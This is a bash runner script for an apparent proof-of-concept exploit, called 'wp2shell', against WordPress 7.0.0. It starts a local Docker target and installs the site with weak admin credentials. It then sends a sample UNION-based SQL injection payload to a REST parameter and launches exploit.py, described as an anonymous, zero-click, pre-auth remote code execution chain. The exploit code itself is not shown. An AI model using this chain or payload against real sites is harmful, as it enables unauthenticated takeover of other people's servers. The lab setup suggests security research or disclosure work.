#!/usr/bin/env bash
# Brings up a STOCK WordPress 7.0.0 target (no plugin, no special DB grants) and
# runs the anonymous wp2shell pre-auth RCE chain (exploit.py).
#   ./run.sh            # up + install + exploit (full 0-click chain)
#   ./run.sh down       # teardown
set -euo pipefail
cd "$(dirname "$0")"
PORT=${PORT:-8888}
BASE="http://localhost:${PORT}"

if [[ "${1:-}" == "down" ]]; then
  docker compose down -v --remove-orphans
  exit 0
fi

echo "[+] starting STOCK target: mysql:8.0 + wordpress:7.0.0 (no plugin, no FILE grant)"
docker compose up -d

echo "[+] waiting for wordpress http ..."
for _ in $(seq 1 90); do
  curl -sf "${BASE}/wp-admin/install.php" >/dev/null 2>&1 && break
  sleep 1
done

echo "[+] installing wordpress (stock) via ${BASE}"
curl -sS "${BASE}/wp-admin/install.php?step=2" \
  --data-urlencode 'weblog_title=PoC' \
  --data-urlencode 'user_name=admin' \
  --data-urlencode 'admin_password=admin' \
  --data-urlencode 'admin_password2=admin' \
  --data-urlencode 'pw_weak=on' \
  --data-urlencode 'admin_email=poc@example.com' \
  --data-urlencode 'blog_public=0' >/dev/null || true

# Keep siteurl/home aligned with the reachable URL so the post-exploitation login
# redirect + plugin upload work.
docker exec wpsqli-wordpress-1 php -r \
  'require "/var/www/html/wp-load.php"; update_option("siteurl","http://localhost:'"${PORT}"'"); update_option("home","http://localhost:'"${PORT}"'");' \
  && echo "[+] siteurl -> ${BASE}"

echo "[+] sanity: direct REST author_exclude is sanitized (expect 400)"
echo -n "    ?rest_route=/wp/v2/posts&author_exclude=<sqli>  -> HTTP "
curl -s -o /dev/null -w '%{http_code}\n' --max-time 12 \
  "${BASE}/?rest_route=/wp/v2/posts&author_exclude=1)%20AND%201%3D0%20UNION%20SELECT%20999--%20-" || true
echo "    (the exploit bypasses this via the batch-route confusion)"

echo
echo "[+] running wp2shell exploit (anonymous, 0-click, no FILE, no crack)"
python3 exploit.py -c "id"
